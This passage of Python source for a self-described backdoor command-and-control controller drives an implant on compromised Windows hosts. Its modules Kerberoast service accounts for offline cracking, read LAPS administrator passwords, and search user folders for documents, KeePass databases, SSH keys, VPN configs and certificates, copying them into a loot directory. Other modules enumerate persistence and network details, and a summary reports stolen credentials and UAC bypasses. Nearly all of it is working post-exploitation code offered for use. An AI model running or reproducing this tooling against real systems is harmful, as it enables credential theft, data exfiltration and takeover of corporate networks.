    if results["spns"] and "SamAccountName" in results["spns"]:
        count = len([l for l in results["spns"].splitlines() if l.strip() and "---" not in l and "Sam" not in l])
        log(f"  [!] {count} Kerberoastable accounts found")

    log("[adrecon] requesting Kerberos TGS tickets for offline cracking...")
    results["kerberoast"] = await _psh(reader, writer,
        'Add-Type -AssemblyName System.IdentityModel; '
        'Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName '
        '| ForEach-Object { '
        '  foreach($spn in $_.ServicePrincipalName) { '
        '    try { '
        '      $t = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn; '
        '      $b = $t.GetRequest(); '
        '      $hex = [System.BitConverter]::ToString($b) -replace "-"; '
        '      "$($_.SamAccountName)|$spn|$hex" '
        '    } catch { "$($_.SamAccountName)|$spn|ERROR:$($_.Exception.Message)" } '
        '  } '
        '}',
        timeout=30)
    if loot_dir and results["kerberoast"] and "ERROR" not in results["kerberoast"]:
        _save_loot(loot_dir, "adrecon", "kerberos_tickets.txt", results["kerberoast"], log)
        log(f"  [!] Kerberos TGS tickets saved for offline cracking")

    log("[adrecon] computers in domain...")
    results["computers"] = await _psh(reader, writer,
        'Get-ADComputer -Filter * -Properties Name,DNSHostName,OperatingSystem,Enabled '
        '| Select-Object Name,DNSHostName,OperatingSystem,Enabled '
        '| Format-Table -AutoSize | Out-String',
        timeout=15)

    log("[adrecon] network shares...")
    results["shares"] = await _exec(reader, writer, "net share")

    log("[adrecon] SMB shares on DC...")
    dc_line = results.get("dcs", "")
    dc_name = ""
    for line in dc_line.splitlines():
        if "\\\\" in line:
            dc_name = line.strip().split("\\\\")[-1].split(".")[0].strip()
            break
    if dc_name:
        results["dc_shares"] = await _exec(reader, writer, f"net view \\\\{dc_name} /all")

    log("[adrecon] password policy...")
    results["passpol"] = await _exec(reader, writer, "net accounts /domain")

    log("[adrecon] checking for LAPS...")
    results["laps"] = await _psh(reader, writer,
        'try { Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd '
        '| Where-Object { $_."ms-Mcs-AdmPwd" -ne $null } '
        '| Select-Object Name,@{N="Password";E={$_."ms-Mcs-AdmPwd"}} '
        '| Format-Table | Out-String } catch { "LAPS not available or no access" }',
        timeout=15)
    if loot_dir and results["laps"] and "not available" not in results["laps"]:
        _save_loot(loot_dir, "adrecon", "laps_passwords.txt", results["laps"], log)
        log(f"  [!] LAPS passwords recovered!")

    if loot_dir:
        full_report = "\n\n".join(f"=== {k} ===\n{v}" for k, v in results.items())
        _save_loot(loot_dir, "adrecon", "full_ad_report.txt", full_report, log)

    return results


async def postexploit_steal(reader, writer, log, loot_dir=None):
    """Search for sensitive files and exfiltrate them."""
    log(_section("FILE EXFILTRATION"))
    results = {}
    exfil_count = 0

    search_patterns = [
        ("Documents", r"C:\Users\*\Documents", "*.docx *.xlsx *.pdf *.kdbx *.key *.pfx *.p12"),
        ("Desktop", r"C:\Users\*\Desktop", "*.docx *.xlsx *.pdf *.kdbx *.key *.pfx *.p12 *.rdp"),
        ("SSH keys", r"C:\Users\*\.ssh", "*"),
        ("Config files", r"C:\Users\*", "*.rdp *.ovpn *.pgp *.ppk *.pem *.p12 *.pfx"),
        ("VPN configs", r"C:\Users\*\OpenVPN\config", "*.ovpn"),
    ]

    log("[steal] scanning and exfiltrating sensitive files...")
    for label, search_dir, patterns in search_patterns:
        for pattern in patterns.split():
            found = await _psh(reader, writer,
                f'Get-ChildItem -Path "{search_dir}" -Filter "{pattern}" -Recurse -Force -ErrorAction SilentlyContinue '
                f'| Where-Object {{ $_.Length -lt {MAX_EXFIL_FILE_SIZE} }} '
                f'| Select-Object FullName,Length | ForEach-Object {{ "$($_.FullName)|$($_.Length)" }}',
                timeout=15)
            if not found.strip():
                continue

            file_entries = [l.strip() for l in found.splitlines() if "|" in l and ":\\" in l]
            if file_entries:
                results[f"{label}_{pattern}"] = f"{len(file_entries)} files"
                log(f"  [!] {label}/{pattern}: {len(file_entries)} files found")

                if loot_dir:
                    for entry in file_entries[:50]:
                        parts = entry.rsplit("|", 1)
                        fpath = parts[0].strip()
                        fsize = int(parts[1]) if len(parts) > 1 and parts[1].strip().isdigit() else 0
                        if fsize > MAX_EXFIL_FILE_SIZE or fsize == 0:
                            continue
                        try:
                            data = await _fileread(reader, writer, fpath, timeout=30)
                            if data and not data.startswith(b"ERR:"):
                                safe_label = label.replace(" ", "_").lower()
                                _save_loot(loot_dir, f"files/{safe_label}",
                                           os.path.basename(fpath), data, log)
                                exfil_count += 1
                        except Exception:
                            pass

    log("[steal] checking for KeePass databases...")
    keepass = await _psh(reader, writer,
        'Get-ChildItem -Path C:\\ -Filter "*.kdbx" -Recurse -Force -ErrorAction SilentlyContinue '
        '| Where-Object { $_.Length -lt 50MB } '
        '| ForEach-Object { "$($_.FullName)|$($_.Length)" }',
        timeout=30)
    if keepass.strip():
        for entry in keepass.strip().splitlines():
            if "|" not in entry:
                continue
            fpath = entry.rsplit("|", 1)[0].strip()
            results["keepass"] = fpath
            log(f"  [!] KeePass DB found: {fpath}")
            if loot_dir:
                try:
                    data = await _fileread(reader, writer, fpath, timeout=30)
                    if data and not data.startswith(b"ERR:"):
                        _save_loot(loot_dir, "files", os.path.basename(fpath), data, log)
                        exfil_count += 1
                except Exception:
                    pass

    log("[steal] checking recent files...")
    results["recent"] = await _psh(reader, writer,
        'Get-ChildItem "$env:APPDATA\\Microsoft\\Windows\\Recent" -Force '
        '| Select-Object Name,LastWriteTime | Sort-Object LastWriteTime -Descending '
        '| Select-Object -First 20 | Format-Table | Out-String')

    log("[steal] exfiltrating downloads...")
    downloads = await _psh(reader, writer,
        'Get-ChildItem "$env:USERPROFILE\\Downloads" -Force '
        '| Where-Object { $_.Length -lt 5MB -and $_.Extension -match "\\.(docx|xlsx|pdf|txt|csv|zip|kdbx|key|pem|pfx)$" } '
        '| ForEach-Object { "$($_.FullName)|$($_.Length)" }')
    if downloads.strip() and loot_dir:
        for entry in downloads.strip().splitlines():
            if "|" not in entry:
                continue
            fpath = entry.rsplit("|", 1)[0].strip()
            try:
                data = await _fileread(reader, writer, fpath, timeout=30)
                if data and not data.startswith(b"ERR:"):
                    _save_loot(loot_dir, "files/downloads", os.path.basename(fpath), data, log)
                    exfil_count += 1
            except Exception:
                pass

    results["exfil_count"] = str(exfil_count)
    log(f"\n  [+] total files exfiltrated: {exfil_count}")
    return results


async def postexploit_persist(reader, writer, log, loot_dir=None):
    """Persistence mechanism enumeration."""
    log(_section("PERSISTENCE ENUMERATION"))
    results = {}

    log("[persist] checking Run/RunOnce keys...")
    for hive, key in [
        ("HKLM", r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
        ("HKLM", r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"),
        ("HKCU", r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
        ("HKCU", r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"),
    ]:
        full = f"{hive}\\{key}"
        results[full] = await _reg(reader, writer, full)
        if results[full] and "ERR:" not in results[full]:
            log(f"  {full}: entries found")

    log("[persist] checking startup folder contents...")
    results["startup_user"] = await _psh(reader, writer,
        'Get-ChildItem "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" -Force '
        '| Select-Object Name | Format-Table | Out-String')
    results["startup_all"] = await _psh(reader, writer,
        'Get-ChildItem "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" -Force '
        '| Select-Object Name | Format-Table | Out-String')

    log("[persist] checking scheduled tasks (non-Microsoft)...")
    results["schtasks_custom"] = await _psh(reader, writer,
        'Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\\Microsoft\\*"} '
        '| Select-Object TaskName,TaskPath,State | Format-Table | Out-String')

    log("[persist] checking WMI event subscriptions...")
    results["wmi_events"] = await _psh(reader, writer,
        'Get-WMIObject -Namespace root\\Subscription -Class __EventFilter '
        '| Select-Object Name,Query | Format-Table | Out-String')

    log("[persist] checking services (non-Microsoft)...")
    results["services"] = await _psh(reader, writer,
        'Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike "*system32*" -and '
        '$_.PathName -notlike "*SysWOW64*"} | Select-Object Name,State,StartMode,PathName '
        '| Format-Table -AutoSize | Out-String')

    return results


async def postexploit_network(reader, writer, log, loot_dir=None):
    """Network reconnaissance."""
    log(_section("NETWORK RECON"))
    results = {}

    log("[network] active connections...")
    results["netstat"] = await _exec(reader, writer, "netstat -ano")

    log("[network] ARP table...")
    results["arp"] = await _exec(reader, writer, "arp -a")

    log("[network] routing table...")
    results["routes"] = await _exec(reader, writer, "route print")

    log("[network] DNS cache...")
    results["dns_cache"] = await _exec(reader, writer, "ipconfig /displaydns")

    log("[network] firewall rules (inbound allow)...")
    results["fw_in"] = await _psh(reader, writer,
        'Get-NetFirewallRule -Direction Inbound -Action Allow -Enabled True '
        '| Select-Object DisplayName,Profile | Format-Table | Out-String',
        timeout=15)

    log("[network] listening ports with process info...")
    results["listeners"] = await _psh(reader, writer,
        'Get-NetTCPConnection -State Listen | Select-Object LocalPort,OwningProcess '
        '| ForEach-Object { $p = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue; '
        '"$($_.LocalPort) -> $($p.ProcessName) (PID $($_.OwningProcess))" } | Sort-Object',
        timeout=15)

    if loot_dir:
        full = "\n\n".join(f"=== {k} ===\n{v}" for k, v in results.items())
        _save_loot(loot_dir, "network", "full_network_report.txt", full, log)

    return results


async def run_post_exploit(reader, writer, logfile, modules=None, loot_dir=None):
    """Run post-exploit modules. modules=None means all."""
    all_modules = {
        "privesc": ("Privilege Escalation", postexploit_privesc),
        "creds": ("Credential Harvesting", postexploit_creds),
        "adrecon": ("AD Reconnaissance", postexploit_adrecon),
        "steal": ("File Exfiltration", postexploit_steal),
        "persist": ("Persistence Enumeration", postexploit_persist),
        "network": ("Network Recon", postexploit_network),
    }

    if modules is None:
        modules = list(all_modules.keys())

    report = {}

    def log(msg):
        line = f"[{ts()}] {msg}"
        print(line, flush=True)
        if logfile:
            logfile.write(line + "\n")
            logfile.flush()

    log(f"\n{'#'*60}")
    log(f"  POST-EXPLOITATION SEQUENCE")
    log(f"  Modules: {', '.join(modules)}")
    if loot_dir:
        log(f"  Loot dir: {loot_dir}")
    log(f"{'#'*60}")

    for mod_name in modules:
        if mod_name not in all_modules:
            log(f"[!] unknown module: {mod_name}")
            continue
        label, func = all_modules[mod_name]
        try:
            result = await func(reader, writer, log, loot_dir=loot_dir)
            report[mod_name] = result
            log(f"\n[+] {label} complete — {len(result)} items collected")
        except (asyncio.TimeoutError, asyncio.IncompleteReadError) as e:
            log(f"\n[-] {label} failed: {e}")
            report[mod_name] = {"error": str(e)}
        except Exception as e:
            log(f"\n[-] {label} error: {e}")
            report[mod_name] = {"error": str(e)}

    log(f"\n{'#'*60}")
    log(f"  POST-EXPLOIT SUMMARY")
    log(f"{'#'*60}")

    highlights = []
    for mod_name, data in report.items():
        if isinstance(data, dict) and "error" in data:
            log(f"  [{mod_name}] ERROR: {data['error']}")
            continue
        count = len(data)
        log(f"  [{mod_name}] {count} items collected")

        if mod_name == "privesc":
            esc = data.get("escalation", "")
            if "admin" in esc:
                highlights.append("PRIVESC: already admin — SAM/SYSTEM/SECURITY dumped")
            elif "success" in esc:
                highlights.append(f"PRIVESC: UAC bypass succeeded ({esc})")
            privs = data.get("privs", "")
            for p in ["SeImpersonatePrivilege", "SeDebugPrivilege"]:
                if p in privs:
                    highlights.append(f"PRIVESC: {p} available")
        elif mod_name == "creds":
            for k, v in data.items():
                if v == "EXFILTRATED":
                    highlights.append(f"CREDS: {k} exfiltrated")
                elif v == "FOUND":
                    highlights.append(f"CREDS: {k} found+pulled")
            wifis = data.get("wifi_passwords", "")
            if wifis and wifis != "none":
                highlights.append(f"CREDS: WiFi passwords recovered")
            if data.get("ssh_keys") == "EXFILTRATED":
                highlights.append("CREDS: SSH private keys exfiltrated")
        elif mod_name == "adrecon":
            if data.get("status") != "NOT_DOMAIN_JOINED":
                if data.get("kerberoast") and "ERROR" not in data.get("kerberoast", ""):
                    highlights.append("AD: Kerberos TGS tickets captured")
                if data.get("laps") and "not available" not in data.get("laps", ""):
                    highlights.append("AD: LAPS passwords recovered")
                highlights.append("AD: domain recon complete")
        elif mod_name == "steal":
            ec = data.get("exfil_count", "0")
            if ec != "0":
                highlights.append(f"STEAL: {ec} files exfiltrated")

    if highlights:
        log(f"\n  [!] HIGH-VALUE FINDINGS:")
        for h in highlights:
            log(f"    -> {h}")

    if loot_dir:
        loot_items = []
        for root, dirs, files in os.walk(loot_dir):
            for f in files:
                fp = os.path.join(root, f)
                loot_items.append((fp, os.path.getsize(fp)))
        total_bytes = sum(s for _, s in loot_items)
        log(f"\n  LOOT: {len(loot_items)} files, {total_bytes:,} bytes total in {loot_dir}")

    return report


async def run_post_exploit_mode(reader, writer, logfile, modules=None, loot_dir=None):
    """Automated post-exploit: wait for heartbeat, run modules, exit."""
    def log(msg):
        line = f"[{ts()}] {msg}"
        print(line, flush=True)
        if logfile:
            logfile.write(line + "\n")
            logfile.flush()

    log("Post-exploit mode — waiting for heartbeat...")
    try:
        cmd_id, payload = await asyncio.wait_for(recv_tlv(reader), timeout=60)
        log(f"Heartbeat received (cmd=0x{cmd_id:02x}, {len(payload)} bytes)")
    except Exception as e:
        log(f"No heartbeat: {e}")
        return 1

    if not loot_dir:
        results_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "results")
        latest = os.path.join(results_dir, "latest")
        if os.path.islink(latest) or os.path.isdir(latest):
            run_dir = os.path.realpath(latest)
        else:
            run_dir = results_dir
        loot_dir = os.path.join(run_dir, f"loot_{datetime.datetime.now():%Y%m%d_%H%M%S}")
    os.makedirs(loot_dir, exist_ok=True)

    report = await run_post_exploit(reader, writer, logfile, modules, loot_dir=loot_dir)

    report_path = os.path.join(loot_dir, "report.json")
    serializable = {}
    for mod, data in report.items():
        serializable[mod] = {}
        for k, v in data.items():
            if isinstance(v, bytes):
                serializable[mod][k] = f"<binary {len(v)} bytes>"
            else:
                serializable[mod][k] = str(v)

    with open(report_path, "w") as f:
        json.dump(serializable, f, indent=2)
    log(f"\nReport saved: {report_path}")

    log("Sending exit...")
    try:
        send_tlv(writer, CMD_EXIT, b"")
        await writer.drain()
    except Exception:
        pass

    has_errors = any(isinstance(v, dict) and "error" in v for v in report.values())
    return 1 if has_errors else 0


async def handle_session(reader, writer, args, logfile):
    addr = writer.get_extra_info("peername")
    print(f"[{ts()}] Connection from {addr}", flush=True)
    if logfile:
        logfile.write(f"[{ts()}] Connection from {addr}\n")
        logfile.flush()

    if args.test_sequence:
        rc = await run_test_sequence(reader, writer, logfile)
    elif args.post_exploit:
        mods = args.modules.split(",") if args.modules else None
        rc = await run_post_exploit_mode(reader, writer, logfile, mods)
    else:
        rc = await run_interactive(reader, writer, logfile)

    writer.close()
    try:
        await writer.wait_closed()
    except Exception:
        pass
    return rc


async def main_async(args):
    results_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "results")
    os.makedirs(results_dir, exist_ok=True)
    latest = os.path.join(results_dir, "latest")
    if os.path.islink(latest) or os.path.isdir(latest):
        run_dir = os.path.realpath(latest)
    else:
        run_dir = results_dir
    log_path = os.path.join(run_dir, f"c2_session_{datetime.datetime.now():%Y%m%d_%H%M%S}.log")
    logfile = open(log_path, "w")

    print(f"[{ts()}] C2 Backdoor Controller", flush=True)
    mode = "test-sequence" if args.test_sequence else ("post-exploit" if args.post_exploit else "interactive")
    print(f"[{ts()}] Mode: {mode}", flush=True)
    print(f"[{ts()}] Listening on 0.0.0.0:{args.port}", flush=True)
    print(f"[{ts()}] Log: {log_path}", flush=True)

    exit_code = 1
    done = asyncio.Event()

    async def on_connect(reader, writer):
        nonlocal exit_code
        exit_code = await handle_session(reader, writer, args, logfile)
        done.set()

    server = await asyncio.start_server(on_connect, "0.0.0.0", args.port)

    try:
        if args.test_sequence or args.post_exploit:
            try:
                await asyncio.wait_for(done.wait(), timeout=args.timeout)
            except asyncio.TimeoutError:
                print(f"[{ts()}] FAIL: no connection within {args.timeout}s", flush=True)
                exit_code = 1
        else:
            await done.wait()
    except KeyboardInterrupt:
        pass
    finally:
        server.close()
        logfile.close()

    return exit_code


def main():
    parser = argparse.ArgumentParser(description="Backdoor C2 controller")
    parser.add_argument("-p", "--port", type=int, default=9001, help="Listen port (default: 9001)")
    parser.add_argument("--test-sequence", action="store_true", help="Run automated test sequence")
    parser.add_argument("--post-exploit", action="store_true",
                        help="Run post-exploit sequence (privesc, creds, adrecon, steal, persist, network)")
    parser.add_argument("--modules", type=str, default=None,
                        help="Comma-separated post-exploit modules (default: all)")
    parser.add_argument("--timeout", type=int, default=120, help="Global timeout in seconds (test/post-exploit mode)")
    args = parser.parse_args()

    rc = asyncio.run(main_async(args))
    sys.exit(rc)


if __name__ == "__main__":
    main()
